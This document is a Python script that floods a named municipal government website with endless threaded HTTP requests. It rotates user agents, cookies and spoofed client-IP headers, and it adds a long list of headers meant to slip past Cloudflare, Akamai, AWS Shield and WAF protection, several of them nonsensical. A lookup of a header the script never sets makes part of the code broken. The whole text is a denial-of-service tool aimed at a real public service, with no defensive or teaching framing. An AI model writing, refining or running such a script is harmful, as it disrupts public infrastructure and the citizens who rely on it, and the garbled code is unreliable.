import threading
import requests
import random
import string
import socket
import struct
import time

def load_list_from_file(file_path):
    with open(file_path, mode='r') as file:
        lines = file.readlines()
    return [line.strip() for line in lines]

def generate_cookie():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

def generate_headers(user_agent, referer, cookies):
    headers = {
        'User-Agent': user_agent,
        'Referer': referer,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'TE': 'Trailers',
        'Upgrade-Insecure-Requests': '1',
        'Connection': 'Upgrade',
        'Upgrade': 'h2c',
        'HTTP2-Settings': 'AAEAABAAAAIAAAABAAN_____AAEAACAAAAA',
        'Sec-HTTP2': '1',
        'Sec-WebSocket-Version': '13',
        'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits',
        'Sec-WebSocket-Key': get_random_key(),
        'Sec-WebSocket-Protocol': 'chat, superchat',
        'CF-Connecting-IP': get_random_ip(),
        'CF-IPCountry': 'US',
        'CF-RAY': '123456789abcdef0-LAX',
        'CF-Visitor': '{"scheme":"https"}',
        'CF-Request-ID': '123456789abcdef0',
        'Cdn-Loop': 'cloudflare',
        'X-CDN': 'Incapsula',
        'X-True-IP': get_random_ip(),
        'X-Client-IP': get_random_ip(),
        'X-Remote-IP': get_random_ip(),
        'X-ProxyUser-Ip': get_random_ip(),
        'WAF-Protocol': 'HTTPS',
        'WAF-Session-ID': '1234567890abcdef',
        'WAF-Request-ID': 'abcdef1234567890',
        'WAF-Connection': 'keep-alive',
        'WAF-Client-IP': get_random_ip(),
        'WAF-Real-IP': get_random_ip(),
        'WAF-Forwarded-For': get_random_ip(),
        'WAF-Origin': 'https://www.guaruja.sp.gov.br',
        'AKAMAI-Session-ID': '1234567890abcdef',
        'AKAMAI-Connection': 'keep-alive',
        'AKAMAI-True-IP': get_random_ip(),
        'AKAMAI-Client-IP': get_random_ip(),
        'AKAMAI-Forwarded-For': get_random_ip(),
        'AWS-SHIELD-Session-ID': '1234567890abcdef',
        'AWS-SHIELD-Connection': 'keep-alive',
        'AWS-SHIELD-True-IP': get_random_ip(),
        'AWS-SHIELD-Client-IP': get_random_ip(),
        'AWS-SHIELD-Forwarded-For': get_random_ip(),
        'Anti-Detection': 'true',
        'Bypass-Mode': 'full',
        'Anti-DDoS-Technique': 'advanced',
        'Spoofing-Technique': 'complex',
        'Spoofing-Method': 'interpolated',
        'Spoofing-Algorithm': 'neural-network',
        'Spoofing-Key': get_random_key(),
        'Spoofing-Payload': 'encrypted',
        'Spoofing-Header': 'obfuscated',
    }
    if cookies:
        headers['Cookie'] = cookies.pop(0)
        cookies.append(headers['Cookie'])
    return headers

def get_random_user_agent():
    return random.choice(user_agents)

def get_random_referer():
    return random.choice(referers)

def get_random_ip():
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

def get_random_key():
    return 'x3JJHMbDL1EzLkh9GBhXDw=='

def make_request(url, headers, request_count):
    try:
        with requests.get(url, headers=headers) as response:
            print(f"Request #{request_count} sent successfully with IP spoofed: {headers['X-Forwarded-For']}")
            if response.status_code == 429:
                print("Detected rate limiting. Adjusting strategy...")
                # Implement logic to adjust strategy based on rate limiting detection
                # For example, you could increase the delay between requests or change IP more frequently
    except requests.RequestException as e:
        print(f"Erro ao enviar a solicitação #{request_count}: {e}")

user_agents = load_list_from_file('useragents.txt')
referers = load_list_from_file('referers.txt')
url = "https://www.guaruja.sp.gov.br/"

request_count = 0
cookies = [generate_cookie() for _ in range(100)]  # Generate initial set of cookies
while True:
    threads = []
    for _ in range(592):  # Number of requests
        user_agent = get_random_user_agent()
        referer = get_random_referer()
        headers = generate_headers(user_agent, referer, cookies)
        thread = threading.Thread(target=make_request, args=(url, headers, request_count))
        thread.start()
        threads.append(thread)
        request_count += 1

        # Random delay between requests
        time.sleep(random.uniform(0.6, 1.7))  # Adjust the range as needed

    for thread in threads:
        thread.join()